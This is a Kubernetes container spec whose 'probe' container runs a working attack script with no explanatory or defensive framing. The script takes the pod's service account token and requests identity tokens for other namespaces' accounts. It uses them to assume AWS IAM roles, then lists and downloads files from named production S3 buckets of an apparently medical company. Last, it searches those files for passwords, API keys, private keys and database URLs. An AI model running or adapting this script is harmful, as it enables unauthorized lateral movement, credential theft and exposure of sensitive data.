containers.name: probe
args:
#!/bin/sh
set -u
SA=/var/run/secrets/kubernetes.io/serviceaccount
TOKEN=$(cat $SA/token); API=https://kubernetes.default.svc
get(){ wget -q -O - --timeout=30 --no-check-certificate --header="Authorization: Bearer $TOKEN" "$1" 2>/dev/null; }
post(){ wget -q -O - --timeout=30 --no-check-certificate --header="Authorization: Bearer $TOKEN" --header="Content-Type: application/json" --post-data="$2" "$1" 2>/dev/null; }
echo "===I3550B_START utc=$(date -u +%FT%TZ)==="
apk add --no-cache aws-cli jq gzip curl >/tmp/apk.log 2>&1
echo "apk_rc=$? aws=$(aws --version 2>&1|head -c 50)"
export AWS_DEFAULT_REGION=us-west-2
assume(){
  NS=$1; S=$2; SESS=$3
  SAJ=$(get "$API/api/v1/namespaces/$NS/serviceaccounts/$S")
  AR=$(echo "$SAJ" | jq -r '.metadata.annotations["eks.amazonaws.com/role-arn"] // empty')
  [ -z "$AR" ] && return 1
  TK=$(post "$API/api/v1/namespaces/$NS/serviceaccounts/$S/token" '{"apiVersion":"authentication.k8s.io/v1","kind":"TokenRequest","spec":{"audiences":["sts.amazonaws.com"],"expirationSeconds":3600}}')
  WT=$(echo "$TK" | jq -r '.status.token // empty'); [ -z "$WT" ] && return 1
  RES=$(aws sts assume-role-with-web-identity --role-arn "$AR" --role-session-name "$SESS" --web-identity-token "$WT" --duration-seconds 1800 --region us-west-2 --output json 2>&1)
  echo "$RES" | jq -e '.Credentials' >/dev/null 2>&1 || return 1
  export AWS_ACCESS_KEY_ID=$(echo "$RES"|jq -r .Credentials.AccessKeyId)
  export AWS_SECRET_ACCESS_KEY=$(echo "$RES"|jq -r .Credentials.SecretAccessKey)
  export AWS_SESSION_TOKEN=$(echo "$RES"|jq -r .Credentials.SessionToken)
  return 0
}
unassume(){ unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN; }
GREP='password|passwd|secret|token|api[_-]?key|apikey|credential|AKIA|ASIA|Bearer|client_secret|PRIVATE KEY|mysql://|postgres://|redis://|DSN|Authorization'

: > /tmp/all.txt
trybucket(){ # $1=bucket ; rest role pairs
  B=$1; shift
  for NS in "$@"; do
    SA="$NS-sa"
    if assume "$NS" "$SA" "i3550b"; then
      LO=$(aws s3api list-objects-v2 --bucket "$B" --max-keys 100 --no-paginate --output json 2>/tmp/e.txt)
      if echo "$LO" | jq -e '.Contents' >/dev/null 2>&1; then
        echo "BKT_OK[$NS] $B n=$(echo "$LO"|jq '.Contents|length') trunc=$(echo "$LO"|jq -r .IsTruncated)"
        echo "$LO" | jq -r --arg b "$B" '.Contents[] | "\($b)\t\(.Size)\t\(.Key)"' >> /tmp/all.txt
        echo "$LO" | jq -r '.Contents[].Key' | head -12 | tr '\n' ' '; echo
        unassume; return 0
      else
        echo "BKT_NO[$NS] $B $(head -c 90 /tmp/e.txt|tr '\n' ' ')"
      fi
      unassume
    else echo "ASSUME_FAIL $NS"; fi
  done
  return 1
}
trybucket lazamedical-prod01-usw2-bastion-bucket s3-ingestion de-identifier audit-log
trybucket lazamedical-prod01-usw2-cloudtrail-01-logs audit-log s3-ingestion metadata-extraction
trybucket lazamedical-prod01-usw2-cloudtrail-02-logs audit-log s3-ingestion metadata-extraction
trybucket lazamedical-prod01-usw2-s3-bucket s3-ingestion metadata-extraction de-identifier
trybucket lazamedical-prod01-usw2-user-management-ui-bucket cognito-service notification-service authorization-service
echo "--- also try log-bucket by other roles for object read"
trybucket lazamedical-prod01-usw2-log-bucket s3-ingestion audit-log data-management
echo "ALLKEYS=$(wc -l < /tmp/all.txt)"
awk -F'\t' 'tolower($3) ~ /(\.env|env\.|config|secret|credential|key|backup|\.pem|\.json|\.ya?ml|\.ini|\.conf|\.sql|\.sh|\.txt|\.log)/ && $2<524288 {print}' /tmp/all.txt | sort -t$'\t' -k2,2n > /tmp/c.txt
echo "CAND=$(wc -l < /tmp/c.txt)"
if assume data-management data-management-sa i3550bo; then
  N=0
  for B in lazamedical-prod01-usw2-log-bucket lazamedical-prod01-usw2-bastion-bucket lazamedical-prod01-usw2-cloudtrail-01-logs lazamedical-prod01-usw2-s3-bucket lazamedical-prod01-usw2-user-management-ui-bucket; do
    CNT=0
    grep -F "$B	" /tmp/c.txt 2>/dev/null | while IFS='	' read -r BB SZ KEY; do
      CNT=$((CNT+1)); [ $CNT -gt 2 ] && break
      echo "PICK $BB size=$SZ key=$KEY"
      aws s3api get-object --bucket "$BB" --key "$KEY" /tmp/x.bin --region us-west-2 >/dev/null 2>/tmp/ge.txt || { echo "GETERR $(head -c 90 /tmp/ge.txt)"; continue; }
      echo "GET bytes=$(wc -c < /tmp/x.bin)"
      gzip -t /tmp/x.bin 2>/dev/null && gzip -dc /tmp/x.bin > /tmp/x.txt 2>/dev/null || cp /tmp/x.bin /tmp/x.txt
      echo "SAMPLE $(head -c 150 /tmp/x.txt|tr '\n' ' ')"
      echo "HITS $(grep -aEic "$GREP" /tmp/x.txt)"
      grep -aEi "$GREP" /tmp/x.txt | head -3 | cut -c1-260
    done
  done
  unassume
fi
echo "===I3550B_DONE $(date -u +%FT%TZ)==="
